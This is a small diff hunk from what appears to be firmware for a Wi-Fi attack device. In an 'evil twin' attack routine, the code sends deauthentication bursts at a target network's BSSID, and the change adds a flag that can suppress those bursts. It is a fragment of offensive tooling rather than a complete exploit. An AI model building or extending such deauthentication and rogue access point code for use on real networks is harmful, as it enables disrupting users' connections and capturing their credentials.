@@ -428,7 +428,7 @@ void attackTask(void* param) {
         break;
       case ATK_EVIL_TWIN: {
         static unsigned long lastTx = 0;
-        if (millis() - evilTwinStartTime > 1000) {
+        if (!g_evilTwinCoop && millis() - evilTwinStartTime > 1000) {
           if (WiFi.softAPgetStationNum() == 0 && millis() - lastTx > 15) {
             sendDeauthBurst(g_targetBSSID);
             lastTx = millis();
